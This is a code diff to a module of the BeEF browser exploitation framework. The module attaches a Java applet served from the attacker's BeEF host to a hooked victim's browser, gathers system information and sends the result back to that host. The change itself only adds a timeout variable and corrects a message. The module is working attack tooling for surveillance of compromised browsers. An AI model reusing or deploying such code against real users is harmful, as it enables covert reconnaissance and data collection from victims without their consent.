@@ -16,8 +16,10 @@
 beef.execute(function() {
 
 	var internal_counter = 0;
+	var timeout = 30;
 	var output;
-    beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', "http://"+beef.net.host+":"+beef.net.port+"/", null, null);
+
+	beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', "http://"+beef.net.host+":"+beef.net.port+"/", null, null);
 
 	if (beef.browser.isFF()) {
 
@@ -35,8 +37,8 @@ beef.execute(function() {
 				return;
 			} catch (e) {
 				internal_counter++;
-				if (internal_counter > 30) {
-					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after 20 seconds');
+				if (internal_counter > timeout) {
+					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after '+timeout+' seconds');
 					beef.dom.detachApplet('getSystemInfo');
 					return;
 				}
